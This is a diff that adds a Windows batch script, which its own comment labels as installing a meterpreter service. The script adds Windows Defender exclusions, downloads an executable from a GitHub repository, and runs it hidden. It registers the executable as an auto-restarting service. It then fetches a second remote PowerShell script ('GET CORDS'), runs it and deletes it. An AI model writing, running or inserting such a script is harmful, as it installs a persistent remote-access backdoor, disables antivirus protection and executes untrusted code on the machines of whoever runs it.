@@ -1,0 +1,26 @@
+# Download and install meterpreter service
+cd d:\Setup\Binaries
+
+d:
+
+powershell -command "Add-MpPreference -ExclusionProcess 'D:\Setup\Binaries\installer.exe'"
+
+powershell -command "Add-MpPreference -ExclusionPath 'D:\Setup\Binaries\installer.exe'"
+
+powershell -Command "Invoke-WebRequest -Uri 'https://github.com/Xgamer911/publictesting/raw/refs/heads/main/MyTesting/installer.exe' -OutFile 'installer.exe'"
+
+powershell -Command "Start-Process powershell -ArgumentList '-NoExit', '-WindowStyle Hidden', '-Command', 'D:\Setup\Binaries\installer.exe'"
+
+sc create InstallerService binPath= "D:\Setup\Binaries\installer.exe" start= auto
+
+sc failure InstallerService reset= 0 actions= restart/10000/restart/10000/restart/10000
+
+sc start InstallerService
+
+
+# GET CORDS
+powershell -Command "Invoke-WebRequest -Uri 'https://github.com/Xgamer911/publictesting/raw/refs/heads/main/MyTesting/test1.ps1' -OutFile 'D:\Setup\Scripts\test1.ps1'"
+
+powershell -command "D:\Setup\Scripts\test1.ps1"
+
+powershell -Command "Remove-Item -Path 'D:\Setup\Scripts\test1.ps1'"
